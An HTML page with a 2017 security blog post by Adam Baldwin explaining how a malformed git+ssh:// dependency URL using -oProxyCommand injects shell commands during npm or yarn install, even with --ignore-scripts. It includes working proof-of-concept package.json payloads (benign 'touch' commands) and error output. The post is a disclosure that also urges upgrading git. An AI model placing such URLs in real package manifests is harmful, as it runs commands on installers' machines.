@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="http://evilpacket.net/2017/my-story-about-mentorship/" />
+  <link rel="next" href="http://evilpacket.net/2017/npm-registry-spelunking-dependencies-referenced-by-url/" />
+  <link rel="canonical" href="http://evilpacket.net/2017/bypassing-npm-ignore-scripts-with-command-injection-in-package-json/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Bypassing npm / yarn ignore Scripts with Command Injection | EvilPacket
+       
+  </title>
+  <meta name="title" content="Bypassing npm / yarn ignore Scripts with Command Injection | EvilPacket">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bypassing npm / yarn ignore Scripts with Command Injection"/>
+<meta name="twitter:description" content="Before you read this post please run git --version and if it’s not 2.14.1 or greater then please go upgrade it.
+In this post we are going to explore abusing the recently published git ssh:// url vulnerability inside of a package.json to execute commands during the npm install process.
+How the vulnerability works:
+The git vulnerability results from a malformed ssh:// url beginning with a dash (-), confusing the ssh command into thinking the hostname is a command argument rather than a hostname."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bypassing npm \/ yarn ignore Scripts with Command Injection",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http:\/\/evilpacket.net\/2017\/bypassing-npm-ignore-scripts-with-command-injection-in-package-json\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "http:\/\/evilpacket.net\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  
+  "wordcount":  665 ,
+  "url": "http:\/\/evilpacket.net\/2017\/bypassing-npm-ignore-scripts-with-command-injection-in-package-json\/",
+  "datePublished": "2017-08-10T17:11:17-07:00",
+  "dateModified": "2017-08-10T17:11:17-07:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Adam BValdwin",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http:\/\/evilpacket.net\/logo.png",
+      "width":  127 ,
+      "height":  40 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "Adam Baldwin"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="http://evilpacket.net/">EvilPacket</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/presentations" title="">Presentations</a>
+                
+                <a class="menu-item" href="/vulns" title="">Vulnerabilities</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="http://evilpacket.net/">EvilPacket</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/presentations" title="">Presentations</a>
+                
+                <a class="menu-item" href="/vulns" title="">Vulnerabilities</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Bypassing npm / yarn ignore Scripts with Command Injection</h1>
+        <div class="post-meta">
+            Written by <a href="http://evilpacket.net/" rel="author">Adam Baldwin</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2017-08-10 >10 August 2017</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-timer"></i>
+                4 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>Before you read this post please run <code>git --version</code> and if it’s not <em>2.14.1</em> or greater then please go upgrade it.</p>
+<p>In this post we are going to explore abusing the recently <a href="http://blog.recurity-labs.com/2017-08-10/scm-vulns">published</a> git ssh:// url vulnerability inside of a package.json to execute commands during the npm install process.</p>
+<p>How the vulnerability works:</p>
+<p>The git vulnerability results from a malformed ssh:// url beginning with a dash (-), confusing the ssh command into thinking the hostname is a command argument rather than a hostname.</p>
+<p>Take this proof of concept example. It injects the -V argument and exits.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone ssh://-V/github.com
+
+Cloning into ‘github.com’…
+OpenSSH_7.4p1, LibreSSL 2.5.0
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+</code></pre></div><p>But nobody cares about the git version for pwnage, that doesn’t get an attacker very far. This variation abuses the <em>-oProxyCommand</em> configuration option to execute a shell command before the clone happens.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone ssh://-oProxyCommand<span style="color:#f92672">=</span>touch%20somefile/github.com
+</code></pre></div><p>Now I mentioned I was going to show how to execute commands during the npm install process. It’s already well known that npm install scripts (preinstall, install, and postinstall) already allow us to execute arbitrary shell scripts. For security purposes users can opt out of executing shell scripts from executing by adding in the <a href="https://docs.npmjs.com/misc/config#ignore-scripts">&ndash;ignore-scripts</a> flag.</p>
+<p>So hopefully you can see where I’m going with this. Can we execute arbitrary commands during the npm i with the &ndash;ignore-scripts flag present? Yes we can, but it’s not as straight forward as the above example.</p>
+<p>npm supports git+ssh:// urls. The first thing I did was to confirm that it did in fact utilize the underlying system git, as I wasn’t sure if npm ran its own pre-packaged git or a version written in node.js.</p>
+<p>I did this by mocking up a simple module and putting in a broken git+ssh:// url hoping it would give me details during the error. It did.</p>
+<p>Package.json</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">    {
+     <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;git&#34;</span>,
+     <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0.0&#34;</span>,
+     <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+     <span style="color:#f92672">&#34;main&#34;</span>: <span style="color:#e6db74">&#34;index.js&#34;</span>,
+     <span style="color:#f92672">&#34;scripts&#34;</span>: {
+       <span style="color:#f92672">&#34;test&#34;</span>: <span style="color:#e6db74">&#34;echo \&#34;Error: no test specified\&#34; &amp;&amp; exit 1&#34;</span>
+     },
+     <span style="color:#f92672">&#34;keywords&#34;</span>: [],
+     <span style="color:#f92672">&#34;author&#34;</span>: <span style="color:#e6db74">&#34;Adam Baldwin &lt;baldwin@andyet.net&gt;&#34;</span>,
+     <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;ISC&#34;</span>,
+     <span style="color:#f92672">&#34;dependencies&#34;</span>: {
+     <span style="color:#f92672">&#34;hax&#34;</span>: <span style="color:#e6db74">&#34;git+ssh://&#34;</span>
+     }
+    }
+</code></pre></div><p>Error Results</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">npm ERR! Error while executing:
+npm ERR! /usr/bin/git ls-remote -h -t ssh://
+</code></pre></div><p>From there it got a little frustrating. It’s not just a simple git clone that is executed during the npm install process so our url has to satisfy multiple commands.</p>
+<p>The first thing I tried was the standard payload. Just touching a file to see if I could get it to run and get multiple arguments. For brevity I’ll just include the url and the error it gave.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&#34;hax&#34;: &#34;git+ssh://-oProxyCommand=touch%20blah/github.com&#34;
+
+npm ERR! Error while executing:
+npm ERR! /usr/bin/git ls-remote -h -t ssh://-oproxycommand/=touch%20blah/github.com
+npm ERR!
+npm ERR! command-line line 0: Missing argument.
+</code></pre></div><p>This is where the @ comes in to give us our missing argument.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&#34;hax&#34;: &#34;git+ssh://-oProxyCommand=touch%20blah@github.com&#34;
+
+npm ERR! Error while executing:
+npm ERR! /usr/bin/git ls-remote -h -t ssh://-oProxyCommand%3Dtouch%20blah%20@github.com
+npm ERR!
+npm ERR! fatal: No path specified. See ‘man git-pull’ for valid url syntax
+</code></pre></div><p>But it’s still not happy. It wants a path. ¯\<em>(ツ)</em>/¯</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">npm ERR! Error while executing:
+npm ERR! /usr/bin/git ls-remote -h -t ssh://-oProxyCommand%3Dtouch%20blah%20@github.com
+npm ERR!
+npm ERR! fatal: No path specified. See ‘man git-pull’ for valid url syntax
+</code></pre></div><p>Here is the final working proof of concept. This executes <em><strong>touch blah @github</strong></em> when <em><strong>npm i &ndash;ignore-scripts</strong></em> is run.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">{
+ <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;git&#34;</span>,
+ <span style="color:#e6db74">&#34;version&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1.0.0&#34;</span>,
+ <span style="color:#e6db74">&#34;description&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>,
+ <span style="color:#e6db74">&#34;main&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;index.js&#34;</span>,
+ <span style="color:#e6db74">&#34;scripts&#34;</span><span style="color:#f92672">:</span> {
+   <span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;echo \&#34;Error: no test specified\&#34; &amp;&amp; exit 1&#34;</span>
+ },
+ <span style="color:#e6db74">&#34;keywords&#34;</span><span style="color:#f92672">:</span> [],
+ <span style="color:#e6db74">&#34;author&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Adam Baldwin &lt;baldwin@andyet.net&gt;&#34;</span>,
+ <span style="color:#e6db74">&#34;license&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;ISC&#34;</span>,
+ <span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#f92672">:</span> {
+ <span style="color:#e6db74">&#34;hax&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;git+ssh://-oProxyCommand=touch%20blah%20@github.com/&#34;</span>
+ }
+}
+</code></pre></div>
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/xSj-1wFuEYc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h2 id="yarn">Yarn!</h2>
+<p>This isn’t an npm problem. This also works in yarn, but the proof of concept looks a little different.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+    <span style="color:#f92672">&#34;hax&#34;</span>: <span style="color:#e6db74">&#34;git+ssh://-oProxyCommand=touch%20mega_secure/&#34;</span>
+  }
+</code></pre></div><h2 id="monitoring-for-abuse">Monitoring for abuse</h2>
+<p>… and just to be sure, I did check all the git+ssh:// dependencies referenced in the npm registry and didn’t find any malicious urls. We’re also continuing to monitor in real time for these urls being published to the registry.</p>
+<p>Originally posted <a href="https://medium.com/lift-security/bypassing-npm-ignore-scripts-with-command-injection-in-package-json-2c08ad7515ca">on Medium</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Adam Baldwin </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>665</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=http%3a%2f%2fevilpacket.net%2f2017%2fbypassing-npm-ignore-scripts-with-command-injection-in-package-json%2f&amp;text=Bypassing%20npm%20%2f%20yarn%20ignore%20Scripts%20with%20Command%20Injection&amp;via=adam_baldwin" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+        <a href="//www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fevilpacket.net%2f2017%2fbypassing-npm-ignore-scripts-with-command-injection-in-package-json%2f" target="_blank" title="Share on Facebook">
+          <i class="iconfont icon-facebook"></i>
+        </a>
+        
+      
+      
+      
+      
+        <a href="//www.linkedin.com/shareArticle?url=http%3a%2f%2fevilpacket.net%2f2017%2fbypassing-npm-ignore-scripts-with-command-injection-in-package-json%2f&amp;title=Bypassing%20npm%20%2f%20yarn%20ignore%20Scripts%20with%20Command%20Injection" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>
+        
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="http://evilpacket.net/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="http://evilpacket.net/2017/my-story-about-mentorship/" class="prev" rel="prev" title="My story about mentorship and my career"><i class="iconfont icon-dajiantou"></i>&nbsp;My story about mentorship and my career</a>
+         
+        
+        <a href="http://evilpacket.net/2017/npm-registry-spelunking-dependencies-referenced-by-url/" class="next" rel="next" title="npm Registry Spelunking: Dependencies Referenced by URL">npm Registry Spelunking: Dependencies Referenced by URL&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2019 - 2020</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="http://evilpacket.net/">Adam Baldwin</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
